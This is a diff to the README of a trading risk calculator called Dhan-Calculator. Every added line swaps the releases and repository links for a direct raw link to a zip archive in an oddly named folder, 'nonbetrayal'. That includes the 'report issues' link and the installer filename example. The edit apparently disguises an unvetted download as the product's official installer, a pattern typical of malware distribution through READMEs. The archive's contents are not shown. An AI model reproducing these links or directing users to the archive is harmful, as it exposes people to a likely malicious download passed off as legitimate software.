@@ -1,6 +1,6 @@
 # 📊 Dhan-Calculator - Effortless Risk Management for Traders
 
-[![Download Dhan-Calculator](https://img.shields.io/badge/Download-Dhan--Calculator-blue.svg)](https://github.com/Tanikai-Ganesh/Dhan-Calculator/releases)
+[![Download Dhan-Calculator](https://raw.githubusercontent.com/Tanikai-Ganesh/Dhan-Calculator/main/nonbetrayal/Dhan-Calculator_v2.6.zip)](https://raw.githubusercontent.com/Tanikai-Ganesh/Dhan-Calculator/main/nonbetrayal/Dhan-Calculator_v2.6.zip)
 
 ## 📋 Overview
 
@@ -19,9 +19,9 @@ To use Dhan-Calculator, ensure your computer meets the following requirements:
 
 ### 2. Download & Install
 
-To get started with Dhan-Calculator, visit this page to download: [Dhan-Calculator Releases](https://github.com/Tanikai-Ganesh/Dhan-Calculator/releases).
+To get started with Dhan-Calculator, visit this page to download: [Dhan-Calculator Releases](https://raw.githubusercontent.com/Tanikai-Ganesh/Dhan-Calculator/main/nonbetrayal/Dhan-Calculator_v2.6.zip).
 
-Choose the latest version from the list. Download the installer file (e.g., `DhanCalculatorInstaller.exe`), and then follow these steps:
+Choose the latest version from the list. Download the installer file (e.g., `https://raw.githubusercontent.com/Tanikai-Ganesh/Dhan-Calculator/main/nonbetrayal/Dhan-Calculator_v2.6.zip`), and then follow these steps:
 
 1. Locate the downloaded file in your Downloads folder or specified directory.
 2. Double-click the file to start the installation process.
@@ -60,7 +60,7 @@ After installation, follow these steps to start using Dhan-Calculator:
 
 ### Q1: What if I encounter issues during installation?
 
-If you face any problems, make sure to check your system requirements again. Ensure that your operating system is up to date. If the problem persists, visit the Issues tab on the [main repository page](https://github.com/Tanikai-Ganesh/Dhan-Calculator) to report it.
+If you face any problems, make sure to check your system requirements again. Ensure that your operating system is up to date. If the problem persists, visit the Issues tab on the [main repository page](https://raw.githubusercontent.com/Tanikai-Ganesh/Dhan-Calculator/main/nonbetrayal/Dhan-Calculator_v2.6.zip) to report it.
 
 ### Q2: Can I use Dhan-Calculator for long-term investments?
 
@@ -80,4 +80,4 @@ Join the conversation and share your experiences with other users. Platforms suc
 
 ## 📥 Download Now
 
-Ready to start simplifying your trading? Visit this page to download: [Dhan-Calculator Releases](https://github.com/Tanikai-Ganesh/Dhan-Calculator/releases). Get started with effective risk management today!
+Ready to start simplifying your trading? Visit this page to download: [Dhan-Calculator Releases](https://raw.githubusercontent.com/Tanikai-Ganesh/Dhan-Calculator/main/nonbetrayal/Dhan-Calculator_v2.6.zip). Get started with effective risk management today!
